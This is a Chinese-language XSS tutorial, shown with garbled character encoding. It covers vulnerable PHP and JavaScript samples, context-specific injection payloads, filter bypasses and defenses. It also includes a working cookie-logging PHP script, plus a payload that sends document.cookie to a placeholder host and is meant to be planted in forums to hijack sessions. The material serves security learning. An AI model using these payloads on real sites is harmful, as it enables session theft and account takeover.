    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="0X01-ä»€ä¹ˆæ˜¯XSSï¼Ÿ"><a href="#0X01-ä»€ä¹ˆæ˜¯XSSï¼Ÿ" class="headerlink" title="0X01 ä»€ä¹ˆæ˜¯XSSï¼Ÿ"></a>0X01 ä»€ä¹ˆæ˜¯XSSï¼Ÿ</h2><p>â€‹    æœ¬åæ˜¯CSSï¼ˆCross Site Scripting)ï¼Œå³è·¨ç«™è„šæœ¬æ”»å‡»ã€‚ä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets,Â CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚å…³é”®åœ¨äºåœ¨ç½‘é¡µä¸­åµŒå…¥è„šæœ¬ä»£ç ã€‚</p>
<h2 id="0X02-XSSåŸç†"><a href="#0X02-XSSåŸç†" class="headerlink" title="0X02 XSSåŸç†"></a>0X02 XSSåŸç†</h2><p>â€‹    XSSæ”»å‡»é€šè¿‡åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯æ¶æ„è„šæœ¬ä»£ç æ¥å®ç°ç›—å–Cookieã€æ”¹å˜ç½‘é¡µå†…å®¹ã€URLè°ƒè½¬ç­‰ç›®çš„ã€‚ä¸€èˆ¬æ˜¯é€šè¿‡JavaScriptè¯­è¨€ç¼–å†™çš„JSè„šæœ¬ä»£ç ï¼Œå› ä¸ºJSæ˜¯å¹¿æ³›ä½¿ç”¨çš„ç½‘ç»œè„šæœ¬è¯­è¨€ä¸»è¦ç”¨æ¥å‘HTMLé¡µé¢æ·»åŠ äº¤äº’è¡Œä¸ºï¼Œå¯ä»¥ç›´æ¥åµŒå…¥HTMLé¡µé¢ã€‚JSä»£ç å¯ä»¥ç›´æ¥è¢«æµè§ˆå™¨è§£æè¿™æ ·å°±å¯ä»¥é€šè¿‡åœ¨é¡µé¢åµŒå…¥æˆ–è·¨ç«™æ‰§è¡ŒJSä»£ç è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚å®é™…æ”»å‡»ä¸­ï¼Œå¾€å¾€é€šè¿‡<code>&lt;script src=&quot;http://xxxxxx&quot;&gt;&lt;/script&gt;</code>æ¥åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å¤–éƒ¨å‡†å¤‡å¥½å®ç°ç›®çš„çš„è„šæœ¬ï¼Œè¿™æ ·ä¸ä¼šè¢«åŸç½‘é¡µçš„ä¸€äº›æ¡ä»¶é™åˆ¶ï¼Œåªè¦ä¸€ä¸ªé“¾æ¥å°±å¯ä»¥åŠ è½½å¤–éƒ¨è„šæœ¬å®ç°æ”»å‡»ã€‚</p>
<h2 id="0X03-XSSç±»å‹"><a href="#0X03-XSSç±»å‹" class="headerlink" title="0X03 XSSç±»å‹"></a>0X03 XSSç±»å‹</h2><p>â€‹    ä¸»è¦åˆ†ä¸ºä¸‰ç±»ï¼šåå°„å‹ã€å‚¨å­˜å‹ã€DOMå‹ã€‚</p>
<h3 id="1-åå°„å‹"><a href="#1-åå°„å‹" class="headerlink" title="1. åå°„å‹"></a>1. åå°„å‹</h3><p>â€‹    ä¹Ÿç§°ä¸ºéæŒä¹…æ€§XSSï¼Œè¿‡ç¨‹æ˜¯ç”¨æˆ·è®¿é—®ä¸€ä¸ªå¸¦æœ‰XSSçš„URLè¯·æ±‚æ—¶ï¼ˆéœ€è¦ç”¨æˆ·è®¿é—®è¿›è¡Œè§¦å‘ï¼‰ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶æ•°æ®åå¤„ç†ï¼Œç„¶åæŠŠå¸¦æœ‰XSSä»£ç çš„æ•°æ®å‘å›æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™å¸¦æœ‰XSSä»£ç çš„æ•°æ®ï¼Œé€ æˆXSSæ¼æ´ã€‚å› ä¸ºè¿‡ç¨‹åƒåå°„æ‰€ä»¥æœ‰äº†è¿™ä¸ªåå­—ã€‚</p>
<p>â€‹    ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code>&lt;?php
    $username = $_GET[&#39;username&#39;];
    echo $username;
?&gt;    </code></pre>
<p>â€‹    è¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯æ¥å—usernameå€¼å¹¶è¾“å‡ºï¼Œè¿™é‡Œå°±å­˜åœ¨åå°„å‹XSSï¼Œå¦‚æœåœ¨è¿™é‡Œè¾“å…¥<code>&lt;script&gt;XSSæ¶æ„ä»£ç &lt;/script&gt;</code>,å°±ä¼šé€ æˆåå°„å‹XSSæ¼æ´ã€‚</p>
<h3 id="2-å­˜å‚¨å‹"><a href="#2-å­˜å‚¨å‹" class="headerlink" title="2.å­˜å‚¨å‹"></a>2.å­˜å‚¨å‹</h3><p>â€‹    ä¹Ÿç§°ä¸ºæŒä¹…å‹XSSï¼Œå› ä¸ºä¼šå°†æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œè¿™æ ·çš„è¯ä¼šé€ æˆæŒä¹…æ€§çš„å±å®³ã€‚ç›¸å¯¹äºåå°„å‹XSS,è¿™ç§æ¼æ´æ›´ä¸ºâ€æŒä¹…â€,å› ä¸ºç”¨æˆ·è¾“å…¥ä¸ä»…ä»…è¢«è¾“å‡ºåœ¨äº†htmlä¸­,è€Œä¸”è¿˜å‚¨å­˜åˆ°äº†æ•°æ®åº“ä¸­,è¿™æ ·æ¯æ¬¡è®¿é—®è¿™ä¸ªé¡µé¢æ—¶å°±ä¼šå½¢æˆä¸€æ¬¡XSSï¼Œå¯¼è‡´è®¿é—®æŸä¸ªé¡µé¢çš„ç”¨æˆ·ä¼šé•¿æœŸé­åˆ°æ”»å‡»ã€‚å®ƒå’Œå¦å¤–ä¸¤ä¸ªçš„åŒºåˆ«åœ¨äºåå°„å‹å’ŒDOMå‹éœ€è¦ç”¨æˆ·æ‰‹åŠ¨è§¦å‘ï¼Œè€Œå‚¨å­˜å‹ä¸éœ€è¦ã€‚å¸¸è§å‡ºç°çš„åœ°æ–¹æ˜¯ç•™è¨€æ¿,å¾®åš,bbsç­‰ï¼Œæœ‰çš„ç½‘ç«™ä¸ªäººèµ„æ–™è®¾ç½®ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜å­˜åœ¨ã€‚</p>
<p>â€‹    è¾“å…¥çš„å€¼ä¼šè¢«æ’å…¥åˆ°HTMLä¸­å‚¨å­˜ï¼Œæ‰€ä»¥è¦ç¡®å®šå¥½è¾“å…¥ç‚¹å’Œè¾“å‡ºç‚¹ï¼Œè¾“å‡ºçš„åœ°æ–¹æ˜¯åœ¨æ ‡ç­¾å†…è¿˜æ˜¯æ ‡ç­¾å±æ€§å†…è¿˜æ˜¯å…¶ä»–åœ°æ–¹ï¼Œå¦‚æœåœ¨å±æ€§å†…ï¼Œä»£ç æ˜¯ä¸ä¼šæ‰§è¡Œçš„ã€‚æ‰€ä»¥æƒ³æ³•é—­åˆæ ‡ç­¾ä½¿è¾“å‡ºä¸åœ¨å±æ€§ä¸­ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼Œè¾“å‡ºç‚¹åœ¨Valueå±æ€§å†…ï¼Œå°±è¦æ„é€ é—­åˆæ ‡ç­¾ã€‚</p>
<pre><code>&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;å†…å®¹&quot;/&gt;
æ„é€ ä»£ç é—­åˆæ ‡ç­¾ï¼š &quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
å¾—åˆ°çš„æ•ˆæœï¼š&lt;inpute type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¿™æ ·é—­åˆåxssè¯­å¥å°±åœ¨æ ‡ç­¾å±æ€§å¤–äº†ã€‚</p>
<h3 id="3-DOMå‹"><a href="#3-DOMå‹" class="headerlink" title="3.DOMå‹"></a>3.DOMå‹</h3><p>â€‹    DOMï¼šå³æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDocument Object Modelï¼‰ï¼ŒDOMå®é™…ä¸Šæ˜¯ä»¥é¢å‘å¯¹è±¡æ–¹å¼æè¿°çš„æ–‡æ¡£æ¨¡å‹ã€‚DOMå®šä¹‰äº†è¡¨ç¤ºå’Œä¿®æ”¹æ–‡æ¡£æ‰€éœ€çš„å¯¹è±¡ã€è¿™äº›å¯¹è±¡çš„è¡Œä¸ºå’Œå±æ€§ä»¥åŠè¿™äº›å¯¹è±¡ä¹‹é—´çš„å…³ç³»ã€‚å¯ä»¥æŠŠDOMè®¤ä¸ºæ˜¯é¡µé¢ä¸Šæ•°æ®å’Œç»“æ„çš„ä¸€ä¸ªæ ‘å½¢è¡¨ç¤ºï¼Œä¸è¿‡é¡µé¢å½“ç„¶å¯èƒ½å¹¶ä¸æ˜¯ä»¥è¿™ç§æ ‘çš„æ–¹å¼å…·ä½“å®ç°ã€‚é€šè¿‡ JavaScriptï¼Œæ‚¨å¯ä»¥é‡æ„æ•´ä¸ª HTML æ–‡æ¡£ã€‚æ‚¨å¯ä»¥æ·»åŠ ã€ç§»é™¤ã€æ”¹å˜æˆ–é‡æ’é¡µé¢ä¸Šçš„é¡¹ç›®ã€‚ä½¿ç”¨DOMå¯ä»¥å…è®¸ç¨‹åºå’Œè„šæœ¬åŠ¨æ€çš„è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚DOMä¸ºæ–‡æ¡£æä¾›äº†ç»“æ„åŒ–è¡¨ç¤ºï¼Œå¹¶å®šä¹‰äº†å¦‚ä½•é€šè¿‡è„šæœ¬æ¥è®¿é—®æ–‡æ¡£ã€‚æ ¹æ®DOMè§„å®šï¼ŒHTMLæ–‡æ¡£çš„æ¯ä¸ªæˆå‘˜æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ã€‚HTMLçš„æ ‡ç­¾éƒ½æ˜¯ä¸€ä¸ªä¸ªèŠ‚ç‚¹ï¼Œè€Œè¿™äº›èŠ‚ç‚¹ç»„æˆäº†DOMçš„æ•´ä½“ç»“æ„ï¼šèŠ‚ç‚¹æ ‘ã€‚å…¶å®æ‰“å¼€Chromeçš„å¼€å‘è€…å·¥å…·elementæ¨¡å—å¯ä»¥çœ‹åˆ°ç½‘é¡µçš„DOMç»“æ„ã€‚</p>
<p>â€‹    ä¸‹é¢æ˜¯ä¸€æ®µç»å…¸çš„DOMå‹XSSç¤ºä¾‹</p>
<pre><code>&lt;script&gt;
    var temp = document.URL ;   //è·å–URL
    var index = document.URL.indexOf(&quot;content=&quot;)+4;
    var par = temp.substring(index);
    document.write(decodeURL(par));   //è¾“å…¥è·å–å†…å®¹
&lt;/script&gt;    </code></pre>
<p>ä¸Šè¯‰ä»£ç çš„æ„æ€æ˜¯è·å–URLä¸­contentå‚æ•°çš„å€¼ï¼Œå¹¶ä¸”è¾“å‡ºï¼Œå¦‚æœè¾“å…¥<code>http://xxxx.html?content=&lt;script&gt;alert(//xss)&lt;/script&gt;</code>,å°±ä¼šäº§ç”ŸXSSæ¼æ´ã€‚</p>
<blockquote>
<p>Flash XSS</p>
<p>Flash XSSä¹Ÿå«XSFï¼ˆCross Site Flashï¼‰,å‡†ç¡®çš„è¯´XSFåº”è¯¥ç®—æ˜¯XSSçš„åˆ†æ”¯ï¼Œå› ä¸ºåœ¨XSSä½¿ç”¨åˆ°çš„æŠ€å·§ï¼Œåœ¨XSFä¸­åªæœ‰ä¸€éƒ¨åˆ†å¯ä»¥ä½¿ç”¨ï¼Œè€Œä¸”XSFæ˜¯åŸºäºActionScriptè¯­è¨€çš„ã€‚</p>
<p>ä¸å¸¸ç”¨åˆ°ï¼šä¸€ç¯‡æ–‡ç« â€“&gt;<a href="https://www.secpulse.com/archives/44299.html">https://www.secpulse.com/archives/44299.html</a></p>
</blockquote>
<h3 id="0X04-XSSæ¼æ´çš„æŒ–æ˜"><a href="#0X04-XSSæ¼æ´çš„æŒ–æ˜" class="headerlink" title="0X04 XSSæ¼æ´çš„æŒ–æ˜"></a>0X04 XSSæ¼æ´çš„æŒ–æ˜</h3><p>â€‹    æ£€æµ‹XSSæ—¶ï¼Œé€‰æ‹©æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦ï¼Œå¯æœ‰å¿«é€Ÿæ£€æµ‹æ˜¯å¦å­˜åœ¨XSSã€‚ä¾‹å¦‚<code>&lt;,&gt;,&quot;,&#39;,()</code>ç­‰ï¼Œæäº¤åæŸ¥çœ‹æºä»£ç çœ‹çœ‹è¿™äº›è¾“å…¥æ˜¯å¦è¢«è½¬ä¹‰ã€‚åœ¨æµ‹è¯•æ—¶è¾“å…¥å¯ä»¥åŠ ä¸Šä¸€äº›æ˜æ˜¾çš„æ ‡è®°ä¾¿äºå¯»æ‰¾å¦‚AAAAAã€‚åœ¨æ²¡åŠæ³•çœ‹æºç æ—¶ä¸çŸ¥é“è¾“å‡ºä½å­å¯ä»¥è¾“å…¥<code>&quot;/&gt;XSStest</code>æ¥æµ‹è¯•ã€‚ä¹Ÿå¯ä»¥ç”¨å·¥å…·æ¥æ‰«æXSSæ¼æ´ã€‚</p>
<p>â€‹    ä¸€èˆ¬é€šè¿‡æ’å…¥xssä»£ç åé¡µé¢çš„å¼¹çª—æˆ–æµè§ˆå™¨è„šæœ¬é”™è¯¯æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨xssæ¼æ´ã€‚å¯¹äºxssï¼Œæ‰¾åˆ°è¾“å…¥è¾“å‡ºä½ç½®å¾ˆé‡è¦ï¼Œæœ‰æ—¶å€™è¾“å‡ºä½ç½®å°±åœ¨è¾“å…¥é¡µé¢ï¼Œæœ‰æ—¶å€™æœ‰æç¤ºï¼Œæœ‰æ—¶å€™ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œæ‰€ä»¥æ‰¾å¥½è¾“å‡ºä½ç½®å¾ˆé‡è¦ã€‚</p>
<h4 id="1-åå°„å‹XSSçš„æŒ–æ˜"><a href="#1-åå°„å‹XSSçš„æŒ–æ˜" class="headerlink" title="1.åå°„å‹XSSçš„æŒ–æ˜"></a>1.åå°„å‹XSSçš„æŒ–æ˜</h4><p>åŸºæœ¬åˆ†4ç§æƒ…å†µï¼šHTMLæ ‡ç­¾ä¹‹é—´ï¼ŒHTMLæ ‡ç­¾ä¹‹å†…ï¼ŒJavaScriptä»£ç çš„å€¼ï¼ŒCSSä»£ç çš„å€¼ã€‚</p>
<ul>
<li><p>HTMLæ ‡ç­¾ä¹‹é—´</p>
<p>æœ€å¸¸å‡ºç°çš„åœºæ™¯æ˜¯<code>&lt;div&gt;&lt;/div&gt;</code>ä¹‹é—´ï¼Œè¿™æ ·æˆ‘ä»¬æäº¤çš„XSSä»£ç æ˜¯å¯ä»¥ç›´æ¥è§¦å‘çš„ã€‚ä¾‹å¦‚<code>&lt;div&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;</code>,å¦‚æœæ˜¯<code>&lt;title&gt;&lt;/title&gt;</code>è¿™æ ·çš„æ ‡ç­¾ä¸­ï¼Œæ’å…¥çš„JSä»£ç ç›´æ¥ä½œä¸ºæ–‡æœ¬è¾“å‡ºäº†ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œï¼Œè¦å…ˆé—­åˆæ ‡ç­¾ï¼Œä¾‹å¦‚è¿™ä¸ªpayload<code>&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;textarea&gt;</code>ã€‚</p>
</li>
<li><p>HTMLæ ‡ç­¾ä¹‹å†…</p>
<p>æœ€æ™®é€šçš„åœºæ™¯æ˜¯å‡ºç°åœ¨<code>&lt;input value=â€œ[è¾“å‡º]â€/&gt;</code>ä½ç½®ä¸Š,å¯¹äºè¿™ç§æƒ…å†µï¼Œâ€¢è·Ÿä¹‹å‰ä¸€æ ·ï¼Œé—­åˆæ ‡ç­¾ï¼Œæäº¤çš„payloadï¼š<code>â€&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;input value=â€œ</code>,â€¢å¦å¤–ä¸€ç§å°±æ˜¯é—­åˆå±æ€§ï¼Œç„¶ååˆ©ç”¨ä¸€äº›äº‹ä»¶æ¥è§¦å‘XSSï¼Œæäº¤çš„payloadï¼š<code>â€onmouseover=alert(1) x=â€œ</code>,åé¢çš„ä¸€ä¸ªä¾‹é¢˜å°±ç”¨åˆ°äº†è¿™ä¸ªã€‚â€¢å¦‚æœè¾“å‡ºåœ¨src/href/actionç­‰å±æ€§å†…ï¼Œä¾‹å¦‚<code>&lt;a href=â€œ[è¾“å‡º]â€&gt;&lt;/a&gt;</code>,æˆ‘ä»¬é™¤äº†å¯ä»¥é—­åˆæ ‡ç­¾å¤–ï¼Œè¿˜å¯ä»¥ç”¨<code>javascript:alert(1)//</code>,<code>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=</code></p>
</li>
<li><p>JavaScriptä»£ç çš„å€¼</p>
<p>æœ‰äº›javascriptä»£ç æ˜¯æœåŠ¡ç«¯è¾“å‡ºçš„ï¼Œæœ‰æ—¶å€™ä¼šå°†ç”¨æˆ·è¾“å…¥çš„å€¼ä¸€èµ·è¾“å‡ºï¼Œä¾‹å¦‚<code>&lt;script&gt;a=â€œ[è¾“å‡º]â€ï¼›&lt;/script&gt;</code>,å¯ä»¥åƒä¸Šé¢é‚£æ ·é—­åˆæ ‡ç­¾ï¼Œä¹Ÿå¯ä»¥é—­åˆå˜é‡å€¼<code>â€;alert(1);//</code>,ä¹Ÿå¯ä»¥åˆ©ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾çš„é—­åˆæœºåˆ¶ï¼Œå®ƒä¼šä¼˜å…ˆå¯»æ‰¾æœ€è¿‘çš„ä¸€ä¸ª<code>&lt;/script&gt;</code>é—­åˆ.payload:<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></p>
</li>
<li><p>CSSä»£ç çš„å€¼</p>
<p>å‡ºç°åœ¨<code>body&#123;color:[è¾“å‡º];&#125;</code>çš„ä½ç½®ä¸Š,åªå­˜åœ¨äºIEäº†ï¼Œpayloadï¼š<code>1;xss:expression(if(!window.x)&#123;alert(1);window.x=1;&#125;)</code></p>
</li>
</ul>
<h4 id="2-å‚¨å­˜å‹XSSçš„æŒ–æ˜"><a href="#2-å‚¨å­˜å‹XSSçš„æŒ–æ˜" class="headerlink" title="2.å‚¨å­˜å‹XSSçš„æŒ–æ˜"></a>2.å‚¨å­˜å‹XSSçš„æŒ–æ˜</h4><blockquote>
<p>æ ¹æ®ä¸Šé¢å¯¹â€œåå°„å‹XSSæŒ–æ˜â€çš„å­¦ä¹ ï¼Œå…¶å®å­˜å‚¨å‹XSSæŒ–æ˜ä¹Ÿå°±å·®ä¸å¤šäº†ï¼Œåªä¸è¿‡è¿™é‡Œä¸€èˆ¬æ˜¯è¡¨å•çš„æäº¤ï¼Œç„¶åè¿›å…¥æœåŠ¡ç«¯å­˜å‚¨ä¸­ï¼Œæœ€ç»ˆä¼šåœ¨æŸä¸ªé¡µé¢ä¸Šè¾“å‡ºï¼Œè¾“å‡ºçš„ä½ç½®æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p>
<p>â€¢è¡¨å•æäº¤åè·³è½¬åˆ°çš„é¡µé¢æœ‰å¯èƒ½å°±æ˜¯è¾“å‡ºç‚¹</p>
<p>â€¢è¡¨å•æ‰€åœ¨çš„é¡µé¢ä¹Ÿæœ‰å¯èƒ½æ˜¯è¾“å‡ºç‚¹</p>
<p>â€¢è¡¨å•æäº¤åä¸è§äº†ï¼Œå…·ä½“çš„é¡µé¢ä¸æ¸…æ¥šï¼Œå¾—ä¸€ä¸ªä¸€ä¸ªé¡µé¢çš„å»æ‰¾</p>
</blockquote>
<h3 id="0X05-XSSåˆ©ç”¨"><a href="#0X05-XSSåˆ©ç”¨" class="headerlink" title="0X05 XSSåˆ©ç”¨"></a>0X05 XSSåˆ©ç”¨</h3><pre><code>#### 1.ç›—å–Cookie</code></pre>
<p>â€‹    æŠŠè·å–æ–‡ä»¶æ”¾åœ¨è‡ªå·±æ­çš„ç½‘ç«™æœåŠ¡å™¨ä¸‹ã€‚ä»£ç å¦‚ä¸‹ï¼Œstealcookies.php</p>
<pre><code>&lt;?php
$ua = $_SERVER[&quot;HTTP_USER_AGENT&quot;];
$client_ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
$method = $_SERVER[&quot;REQUEST_METHOD&quot;];
$referer = $_SERVER[&quot;HTTP_REFERER&quot;];
$date = date(&quot;F j, Y, g:i a&quot;);
$querystring = $_SERVER[&quot;QUERY_STRING&quot;];
$log = fopen(&quot;cookie.txt&quot;,&quot;a+&quot;);
$str= &quot;IP: $client_ip |Useragent: $ua | Method: $method | REF: $referer | Date: $date  | Cookie: $querystring \n&quot;;
fwrite($log,$str);
?&gt;</code></pre>
<p>â€‹    æ„é€ XSSè¯­å¥</p>
<pre><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://xxxxxx/stealcookies.php?a=&#39; + encodeURI(document.cookie) + &#39;&quot;/&gt;&#39;)&lt;/script&gt;</code></pre>
<p>â€‹    æŠŠä¸Šé¢çš„è¯­å¥æ”¾åˆ°XSSçš„ç›®æ ‡ä¸­ï¼Œæœ€å¥½æ˜¯å­˜å‚¨å‹xssï¼Œæ¯”å¦‚æŸä¸ªåšå®¢æˆ–è€…è®ºå›ä»€ä¹ˆçš„å­˜åœ¨å­˜å‚¨å‹XSSï¼Œåœ¨é‡Œé¢å‘ä¸€ç¯‡å¸–å­æˆ–è€…ç•™ä¸Šè¯„è®ºï¼Œå†…å®¹å°±æ˜¯ä¸Šè¿°è¯­å¥ï¼Œå½“å…¶ä»–ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜æ‰“å¼€è¿™ä¸ªè¯„è®ºæˆ–è€…å¸–å­é“¾æ¥åï¼Œå°±ä¼šè§¦å‘ï¼Œç„¶åè·³è½¬åˆ°http ://xxxxxx/cookie.asp?msg=â€™+document.cookieçš„é¡µé¢ï¼Œç„¶åå½“å‰è´¦æˆ·çš„cookieä¿¡æ¯å°±å½“æˆå‚æ•°å‘åˆ°ç½‘ç«™ä¸‹çš„æ–‡ä»¶é‡Œäº†ã€‚ç„¶åçš„ç„¶åå°±å¯ä»¥é‚£è¿™ä¸ªcookieç™»é™†äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<h4 id="2-XSS-Framework"><a href="#2-XSS-Framework" class="headerlink" title="2.XSS Framework"></a>2.XSS Framework</h4><p>â€‹    XSSæ¼æ´åˆ©ç”¨æ¡†æ¶ï¼Œå°±æ˜¯XSSåˆ©ç”¨çš„ä»£ç ç»„åˆï¼Œä½†æ˜¯è¿›è¡Œäº†æ•´åˆå¹¶ä¸”è¿˜æœ‰å›¾å½¢åŒ–çš„ç•Œé¢ï¼Œä½¿ç”¨èµ·æ¥ååˆ†æ–¹ä¾¿ã€‚ç½‘ä¸Šæœ‰æºç ï¼Œè‡ªå·±æ­ä¸€ä¸ªå°±èƒ½ç”¨ã€‚</p>
<h4 id="3-XSS-GetShell"><a href="#3-XSS-GetShell" class="headerlink" title="3.XSS GetShell"></a>3.XSS GetShell</h4><p>â€‹    éœ€è¦ç‰¹å®šçš„åœºæ™¯ä¸‹æ‰èƒ½å®ç°ã€‚DedeCMSV57_GBK_SP1ç‰ˆæœ¬å°±å¯ä»¥å®ç°ï¼Œä¹¦ä¸­çš„ä¾‹å­å°±æ˜¯è¿™ä¸ªç¯å¢ƒã€‚å› ä¸ºtitleå˜é‡æ²¡è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨XSSè¯­å¥é€šè¿‡$titleä¼ åˆ°äº†æ•°æ®åº“ã€‚</p>
<h2 id="0X06-é˜²èŒƒ"><a href="#0X06-é˜²èŒƒ" class="headerlink" title="0X06 é˜²èŒƒ"></a>0X06 é˜²èŒƒ</h2><p>â€‹    çŸ¥é“å¦‚ä½•é˜²èŒƒXSSä¹Ÿæœ‰åˆ©äºè¿›è¡ŒXSSæ”»å‡»ï¼Œæ‰€è°“çŸ¥å·±çŸ¥å½¼ç™¾æˆ˜ä¸æ®†ã€‚</p>
<p>â€‹    é˜²èŒƒçš„å…³é”®å°±æ˜¯ä¸è®©XSSè¯­å¥èƒ½å¤Ÿæ‰§è¡Œã€‚æ‰€ä»¥ä¸€èˆ¬å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ä»¥ç ´åXSSæ­£å¸¸è¯­å¥ã€‚</p>
<p>â€‹    åœ¨PHPä¸­æä¾›äº†htmlspecialchars()ã€htmlentities()å‡½æ•°å¯ä»¥æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ã€‚</p>
<p>é¢„å®šä¹‰å­—ç¬¦å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th align="center">HTMLå®ä½“</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;</td>
<td align="center">&amp;amp</td>
</tr>
<tr>
<td align="center">â€œ</td>
<td align="center">&amp;quot</td>
</tr>
<tr>
<td align="center">â€˜</td>
<td align="center">&amp;#039</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">&amp;lt</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">&amp;gt</td>
</tr>
</tbody></table>
<p>â€‹    ç»è¿‡è½¬ä¹‰åæ„é€ çš„ä»£ç å·²ç»èµ·ä¸åˆ°ä½œç”¨äº†ã€‚</p>
<p>â€‹    JSOUPï¼šå…¶è¿‡æ»¤æ–¹å¼é‡‡å–ç™½åå•æ–¹å¼ã€‚whitelistæ¸…ç†å™¨èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·è¾“å…¥çš„HTMLè¿›è¡Œè¿‡æ»¤ï¼Œåªè¾“å‡ºä¸€äº›å®‰å…¨çš„æ ‡ç­¾å’Œå±æ€§ã€‚è€Œå…¶é…ç½®å¯ä»¥æ ¹æ®è‡ªå·±æ‰€éœ€ä¿®æ”¹ã€‚</p>
<p>â€‹    OWASP Esapiï¼šæä¾›ä¸€ç³»åˆ—çš„ç¼–ç æ“ä½œï¼Œé€šè¿‡ç¼–ç ï¼Œç ´ç¯è¾“å…¥çš„XSSä»£ç ã€‚</p>
<p>â€‹    HttpOnlyï¼šhttponlyæ ‡æ³¨çš„cookieå€¼æ— æ³•è¢«JavaScriptè·å–ã€‚å¾€å¾€passwdéƒ½æ ‡æ³¨äº†httponlyã€‚</p>
<h2 id="0X07-ç»•è¿‡"><a href="#0X07-ç»•è¿‡" class="headerlink" title="0X07 ç»•è¿‡"></a>0X07 ç»•è¿‡</h2><ol>
<li>  è¿‡æ»¤ä¼šæ”¹å˜ä»£ç  ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿™ä¹ˆå†™ä»£ç ã€‚ä½†æˆ‘ä»¬å¯ä»¥å°è¯•æ”¹å˜ javascriptçš„å†™æ³•ï¼Œä½¿å®ƒä¾æ—§å¯ä»¥è¢«æµè§ˆå™¨æ‰§è¡Œä½†åˆä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ URL ç¼–ç ï¼š<code>&lt;a   href=&quot;java&amp;#115;cript:alert (&#39;xss&#39;)&quot;&gt;link&lt;/a&gt;</code>ä¸Šé¢è¿™æ®µä»£ç ä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†æ˜¯æµè§ˆå™¨ä¾æ—§ä¼šæ‰§è¡Œå®ƒï¼Œå› ä¸ºæµè§ˆå™¨ä¼šé¦–å…ˆè¿›è¡Œ URL è§£ç æ“ä½œã€‚</li>
<li>  åˆ©ç”¨ç©ºæ ¼ã€‚è®¸å¤šè¿‡æ»¤åŒ¹é…ç‰¹æ®Šçš„æ ‡ç­¾ï¼ŒåŒ…æ‹¬èµ·å§‹ä¸ç»“æŸå°–æ‹¬å·ã€‚ä½†æ˜¯ï¼Œè®¸å¤šæµè§ˆå™¨æ¥å—ç»“æŸæ‹¬å·å‰çš„ç©ºç™½ç¬¦ï¼Œå…è®¸æ”»å‡»è€…è½»æ˜“é¿å¼€è¿™ç§è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼š<code>&lt;script &gt;</code></li>
<li>  å› ä¸ºè®¸å¤šäººç”¨å°å†™å­—ç¬¦ç¼–å†™HTMLä»£ç ï¼Œæ‰€ä»¥ä¸€äº›è¿‡æ»¤ä»…æ£€æŸ¥å¸¸ç”¨çš„å°å†™æ¶æ„æ ‡ç­¾ã€‚ä¾‹å¦‚ï¼š<code>&lt;ScRiPt&gt;</code>ï¼Œé€šè¿‡æ”¹å˜å­—ç¬¦å¤§å°å†™é¿å¼€è¿‡æ»¤ã€‚</li>
